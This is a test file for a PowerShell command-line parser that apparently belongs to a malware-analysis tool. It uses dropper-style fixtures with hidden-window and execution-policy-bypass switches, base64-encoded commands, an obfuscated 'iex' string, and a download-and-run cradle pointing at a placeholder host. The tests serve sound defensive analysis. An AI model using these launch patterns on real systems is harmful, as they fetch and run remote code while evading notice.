// SPDX-License-Identifier: PolyForm-Small-Business-1.0.0
// Required Notice: Copyright 2026 Mo4n6 (https://github.com/Mo4n6/tools)

import { describe, expect, it } from 'vitest';

import { describeLauncher, parseLauncher } from '../launcher';

describe('parseLauncher', () => {
  it('leaves a plain script alone', () => {
    // Safe to run over everything, so it has to be a no-op on a script.
    const script = 'Write-Host "hello husk"';
    const parse = parseLauncher(script);

    expect(parse.isLauncher).toBe(false);
    expect(parse.script).toBe(script);
    expect(parse.switches).toEqual([]);
    expect(describeLauncher(parse)).toBeUndefined();
  });

  it('does not mistake a script that mentions powershell for a launcher', () => {
    const parse = parseLauncher('$x = "powershell.exe"; Write-Host $x');
    expect(parse.isLauncher).toBe(false);
  });

  it('takes the bare trailing argument as the script', () => {
    const parse = parseLauncher('powershell "Write-Host hi"');

    expect(parse.isLauncher).toBe(true);
    expect(parse.executable).toBe('powershell');
    expect(parse.script).toBe('Write-Host hi');
    expect(parse.quoting).toBe('double');
  });

  it('resolves the abbreviations droppers actually use', () => {
    const parse = parseLauncher('powershell.exe -nop -w hidden -ep bypass -noni -c "whoami"');

    expect(parse.script).toBe('whoami');
    expect(parse.switches.map((entry) => entry.canonical)).toEqual([
      'NoProfile',
      'WindowStyle',
      'ExecutionPolicy',
      'NonInteractive',
      'Command',
    ]);
    // The switches are evidence of intent, so the values survive.
    expect(parse.switches[1].value).toBe('hidden');
    expect(parse.switches[2].value).toBe('bypass');
  });

  it('reads -e as EncodedCommand and -ep as ExecutionPolicy', () => {
    // Both start with an e and the real parser resolves them this way round.
    expect(parseLauncher('powershell -e ZgBvAG8A').switches[0].canonical).toBe('EncodedCommand');
    expect(parseLauncher('powershell -ep bypass -c x').switches[0].canonical).toBe(
      'ExecutionPolicy',
    );
  });

  it('decodes -EncodedCommand as UTF-16LE', () => {
    // 'Write-Host "hi"' in UTF-16LE, base64. Decoding as UTF-8 yields text
    // interleaved with NULs, which looks plausible and is wrong.
    const encoded = Buffer.from('Write-Host "hi"', 'utf16le').toString('base64');
    const parse = parseLauncher(`powershell.exe -nop -enc ${encoded}`);

    expect(parse.script).toBe('Write-Host "hi"');
    expect(parse.encoding).toBe('base64-utf16le');
  });

  it('reports a -EncodedCommand value it cannot decode instead of guessing', () => {
    const parse = parseLauncher('powershell -enc not!base64!');

    expect(parse.encoding).toBeUndefined();
    expect(parse.notes.join(' ')).toContain('not valid base64');
  });

  it('undoes cmd.exe escaping, which cost five corpus fixtures', () => {
    // cmd escapes a quote as \" and a pipe as ^|, and consumes both before
    // PowerShell sees them. Left in place, the engine was handed literal
    // backslashes and tried to run a command named \[\.
    const parse = parseLauncher('powershell "${#}=\\"[\\"+\\"a\\" ^| iex"');

    expect(parse.script).toBe('${#}="["+"a" | iex');
    expect(parse.quoting).toBe('cmd');
  });

  it('calls double quoting double when there was nothing to unescape', () => {
    // The distinction matters in the report: 'cmd' means a shell rewrote the
    // command line, which says something about how the sample was delivered.
    expect(parseLauncher('powershell "Write-Host hi"').quoting).toBe('double');
    expect(parseLauncher("powershell 'Write-Host hi'").quoting).toBe('single');
  });

  it('accepts cmd-style forward-slash switches', () => {
    const parse = parseLauncher('powershell /c "whoami"');

    expect(parse.switches[0].canonical).toBe('Command');
    expect(parse.script).toBe('whoami');
  });

  it('accepts a full path to the executable', () => {
    const parse = parseLauncher(
      'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -c "hi"',
    );

    expect(parse.isLauncher).toBe(true);
    expect(parse.script).toBe('hi');
  });

  it('keeps everything after -Command, pipes and all', () => {
    const parse = parseLauncher('powershell -Command Get-Process | Where-Object { $_.Id -gt 4 }');

    expect(parse.script).toBe('Get-Process | Where-Object { $_.Id -gt 4 }');
  });

  it('records an unrecognised switch rather than dropping it', () => {
    // It might be the thing that explains why the sample behaved differently
    // than the report says.
    const parse = parseLauncher('powershell -notaswitch -c "hi"');

    expect(parse.notes.join(' ')).toContain('-notaswitch');
    expect(parse.switches[0].canonical).toBeUndefined();
    expect(parse.script).toBe('hi');
  });

  it('says so when a launcher carries no script', () => {
    const parse = parseLauncher('powershell.exe -nop -w hidden');

    expect(parse.isLauncher).toBe(true);
    expect(parse.script).toBe('');
    expect(parse.notes.join(' ')).toContain('no script found');
  });

  it('describes the launcher in one line for the report', () => {
    const parse = parseLauncher('powershell.exe -nop -w hidden -ep bypass -c "whoami"');

    expect(describeLauncher(parse)).toBe(
      'powershell.exe NoProfile WindowStyle hidden ExecutionPolicy bypass Command',
    );
  });

  it('names the encoding and the escaping in that line', () => {
    const encoded = Buffer.from('hi', 'utf16le').toString('base64');
    expect(describeLauncher(parseLauncher(`powershell -enc ${encoded}`))).toContain(
      'base64 UTF-16LE',
    );
    expect(describeLauncher(parseLauncher('powershell "a ^| b"'))).toContain('cmd.exe escaping');
  });
});

describe('what the engine is handed', () => {
  // The engine worker runs parseLauncher(source).script rather than the source.
  // Handing it the raw command line runs `powershell` as a PowerShell command,
  // which it is not, so nothing executes and the whole analysis comes back
  // empty - and `powershell -enc ...` is the single most common shape a real
  // sample arrives in. The product's own example is one.
  it('yields the decoded payload for an -enc command line', () => {
    const encoded = Buffer.from("Write-Host 'hi'", 'utf16le').toString('base64');
    const parse = parseLauncher(`powershell -nop -w hidden -enc ${encoded}`);
    expect(parse.isLauncher).toBe(true);
    expect(parse.script).toBe("Write-Host 'hi'");
  });

  it('yields the input unchanged when it is already a script', () => {
    // The worker runs this unconditionally, so a plain script must survive it.
    const script = "IEX ((New-Object Net.WebClient).DownloadString('http://x/y'))";
    expect(parseLauncher(script).script).toBe(script);
  });
});
